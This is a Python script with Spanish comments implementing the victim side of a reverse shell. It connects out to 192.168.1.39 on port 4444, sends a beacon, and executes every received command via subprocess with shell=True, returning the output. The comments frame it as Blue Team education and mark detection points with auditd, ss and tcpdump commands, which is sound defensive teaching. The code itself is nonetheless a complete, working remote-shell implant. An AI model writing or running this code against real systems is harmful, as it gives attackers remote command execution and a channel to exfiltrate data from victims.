#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# =============================================================================

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ IMPORTACIÓN DE LIBRERÍAS                                                │
# └─────────────────────────────────────────────────────────────────────────┘
import socket, subprocess
    # socket     → Comunicaciones de red (conectar, enviar/recibir datos)
    # subprocess → Ejecutar comandos del sistema (CRÍTICO - mayor IoC)
    #
    # 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA en EDR/Sysmon
    # 🛡️ MANJARO: sudo ausearch -c python3 | sudo journalctl -f
# ┌─────────────────────────────────────────────────────────────────────────┐
# │ FUNCIÓN DE EJECUCIÓN DE COMANDOS                                        │
# └─────────────────────────────────────────────────────────────────────────┘
def ejecutarComando(command):
    # check_output() → Ejecuta comando y captura la salida
    # shell=True     → Ejecuta a través del shell (/bin/sh en Linux)
    #
    # 🛡️ DETECCIÓN: python → bash/sh (auditd/EDR) - EL MAYOR IoC
    # 🛡️ COMANDO MANJARO: sudo ausearch -c python3 --start recent
    return subprocess.check_output(command, shell=True)
# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CREACIÓN DEL SOCKET                                                     │
# └─────────────────────────────────────────────────────────────────────────┘
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # socket.socket() → Crea un endpoint de comunicación de red
    # AF_INET         → Familia de direcciones IPv4
    # SOCK_STREAM     → Protocolo TCP (orientado a conexión, confiable)
    #
    # 🛡️ DETECCIÓN: La creación del socket no es visible en red
    # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CONEXIÓN SALIENTE AL ATACANTE - PUNTO DE DETECCIÓN #1 ⚠️                │
# └─────────────────────────────────────────────────────────────────────────┘
connection.connect(("192.168.1.39", 4444))
    # connect()       → Inicia conexión TCP al servidor del atacante
    # 192.168.1.39    → IP del atacante (C2 server)
    # 4444            → Puerto del atacante
    #
    # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444 (Firewall/IDS)
    # 🛡️ COMANDO MANJARO: sudo ss -antp | grep 4444
# ┌─────────────────────────────────────────────────────────────────────────┐
# │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️                              │
# └─────────────────────────────────────────────────────────────────────────┘
connection.send(" \n [+] Conexion Exitosamente Establecida \n".encode('utf-8'))
    # send()          → Envía datos al atacante a través del túnel TCP
    # encode('utf-8') → Convierte string a bytes (requerido en Python 3)
    #
    # 🛡️ DETECCIÓN #2: Firma de texto "Conexion Exitosamente" (DLP/IDS)
    # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
# ┌─────────────────────────────────────────────────────────────────────────┐
# │ BUCLE PRINCIPAL - ESPERA DE COMANDOS                                    │
# └─────────────────────────────────────────────────────────────────────────┘
while True: # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3                       │
    # └─────────────────────────────────────────────────────────────────────┘
    command = connection.recv(1024)
        # recv(1024) → Espera y recibe hasta 1024 bytes del atacante
        #
        # 🛡️ DETECCIÓN #3: Tráfico entrante en conexión establecida
        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -n -v     
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️ (EL MÁS CRÍTICO)    │
    # └─────────────────────────────────────────────────────────────────────┘
    resultadosComando = ejecutarComando(command)
        
        # ejecutarComando() → Llama a la función que ejecuta el comando
        # command           → Son BYTES desde recv(), subprocess lo acepta
        #
        # 🛡️ DETECCIÓN #4: python → bash/sh (auditd/EDR) - EL MAYOR IoC
        # 🛡️ COMANDO MANJARO: sudo ausearch -c python3 --start recent
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️                               │
    # └─────────────────────────────────────────────────────────────────────┘
    connection.send(resultadosComando)
        # send() → Envía resultados al atacante (exfiltración)
        #
        # 🛡️ DETECCIÓN #5: Datos salientes sensibles (DLP/Wireshark)
        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CIERRE DE CONEXIÓN - NUNCA SE EJECUTA ⚠️                                │
# └─────────────────────────────────────────────────────────────────────────┘
connection.close()
    # close() → Cierra el socket y libera el puerto
    #
    # ⚠️ PROBLEMA: Está FUERA del while True, NUNCA se ejecuta
    # ✅ SOLUCIÓN: Moverlo DENTRO del while con un try/except
    #
    # 🛡️ DETECCIÓN: Socket queda abierto hasta que el proceso muere
    # 🛡️ COMANDO MANJARO: sudo netstat -antp | grep python